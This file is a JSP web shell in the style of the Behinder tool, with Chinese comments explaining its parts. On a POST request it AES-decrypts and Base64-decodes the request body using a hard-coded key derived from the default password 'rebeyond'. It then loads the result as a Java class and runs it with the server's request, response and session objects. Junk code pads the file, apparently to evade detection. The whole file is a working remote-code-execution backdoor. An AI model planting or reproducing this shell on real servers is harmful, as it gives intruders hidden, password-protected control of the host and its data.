<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*" %>
<%@ page import="java.io.UnsupportedEncodingException" %>

<%!
    public  class Controller extends ClassLoader {



        public Class getClass(byte[] b) throws UnsupportedEncodingException {

            String encoding = "UTF-8";
            String s = new String(b,encoding);
            byte[] res = new byte[b.length];
            System.out.println(b.length);
            for (int i = 0; i < b.length/2; i++) {
//                System.out.print("orgin: " + b[i]);
                res[i] = (byte) (b[i] + 1);
            }
            for (int i = 0; i < b.length/2; i++) {
//                System.out.print("orgin: " + b[i]);
                b[i] = (byte) (res[i] - 1);
            }

            byte[] bytes = s.getBytes(encoding);
            String s1 = new String(bytes,encoding);
            System.out.println(s);
            System.out.println(s1);
            System.out.println(s.equals(s1));
            if (!b.toString().equals(bytes.toString())){
                System.out.println("do nothing");
            }
            // 调用父类的defineClass函数 , 相当于自定义加载类
            //这句代码将返回一个 java.lang.Class 对象。这个类对象表示通过字节数组 b 中的类文件数据动态加载的类。
            // defineClass 方法用于将二进制数据转换为类的实例。
            Class<?> aClass = super.defineClass(b, 0, b.length);
            return aClass;
        }

        //构造函数
        public Controller(ClassLoader c) {
            super(c);
            //啦啦啦
            int a = 1;
            int b = a << 2;
            System.out.println(a+b);
        }
    }
%><%


    if (request.getMethod().startsWith("P"+"O")) {
        String text = "e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
        HashMap<String, Object> hashMap = new HashMap<>();
        session.putValue("u", text);
        hashMap.put("request",request);
        hashMap.put("response",response);
        hashMap.put("session",session);

        Cipher c = Cipher.getInstance("AES");
        c.init(2, new SecretKeySpec(text.getBytes(), "AES"));
        new Controller(this.getClass().getClassLoader())
                //调用方法g 加载一个类
                .getClass(
                        c.doFinal(
                                //sun.misc.BASE64Decoder 类被用于解码 HTTP POST 请求中的数据，
                                // 该数据经过 BASE64 编码。这个操作通常在服务器端用于处理客户端传递的数据，
                                // 尤其是在需要进行数据解密或还原时。
                                new sun.misc.BASE64Decoder()
                                        .decodeBuffer(request.getReader().readLine())))
                //调用完g 加载一个类，调用newInstance() 后 ,相当于new
                .newInstance().equals(hashMap);
    }
%>